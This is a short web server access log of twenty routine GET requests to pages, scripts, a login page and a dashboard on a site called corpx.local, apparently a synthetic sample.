17.58.99.83 - - [08/Nov/2024:08:25:42 +0000] "GET /search?q=linux HTTP/1.1" 200 7452 "https://bing.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
8.8.4.4 - - [08/Nov/2024:08:25:53 +0000] "GET /js/main.js HTTP/1.1" 200 15705 "https://corpx.local/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
198.51.100.23 - - [08/Nov/2024:08:26:05 +0000] "GET /contact.html HTTP/1.1" 200 3269 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
52.26.198.20 - - [08/Nov/2024:08:26:24 +0000] "GET /team.html HTTP/1.1" 200 4630 "https://corpx.local/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
40.77.167.80 - - [08/Nov/2024:08:26:46 +0000] "GET /feed/ HTTP/1.1" 200 12502 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
162.158.92.14 - - [08/Nov/2024:08:26:59 +0000] "GET /dashboard.php HTTP/1.1" 200 9724 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
99.83.231.61 - - [08/Nov/2024:08:27:20 +0000] "GET /dashboard.php HTTP/1.1" 200 10161 "https://bing.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
185.220.101.9 - - [08/Nov/2024:08:27:23 +0000] "GET /css/style.css HTTP/1.1" 200 23389 "https://corpx.local/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
162.158.92.14 - - [08/Nov/2024:08:27:34 +0000] "GET /services.html HTTP/1.1" 200 5782 "https://corpx.local/" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
185.107.56.90 - - [08/Nov/2024:08:27:49 +0000] "GET /login.php HTTP/1.1" 200 5665 "https://bing.com/" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
157.240.22.35 - - [08/Nov/2024:08:28:03 +0000] "GET /docs/ HTTP/1.1" 200 5155 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
8.8.4.4 - - [08/Nov/2024:08:28:11 +0000] "GET /404.html HTTP/1.1" 404 2126 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
46.101.45.200 - - [08/Nov/2024:08:28:17 +0000] "GET /contact.html HTTP/1.1" 200 2975 "https://bing.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.254.1 - - [08/Nov/2024:08:28:35 +0000] "GET /feed/ HTTP/1.1" 200 12451 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
8.8.4.4 - - [08/Nov/2024:08:28:39 +0000] "GET /blog/ HTTP/1.1" 200 8551 "https://bing.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
216.58.214.46 - - [08/Nov/2024:08:28:49 +0000] "GET /wp-login.php HTTP/1.1" 404 0 "https://corpx.local/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
77.88.55.66 - - [08/Nov/2024:08:29:04 +0000] "GET /sitemap.xml HTTP/1.1" 200 4195 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
54.230.123.44 - - [08/Nov/2024:08:29:06 +0000] "GET /css/style.css HTTP/1.1" 200 23643 "https://bing.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
93.184.216.34 - - [08/Nov/2024:08:29:24 +0000] "GET /favicon.ico HTTP/1.1" 200 1072 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
66.249.64.20 - - [08/Nov/2024:08:29:43 +0000] "GET /dashboard.php HTTP/1.1" 200 10153 "https://bing.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
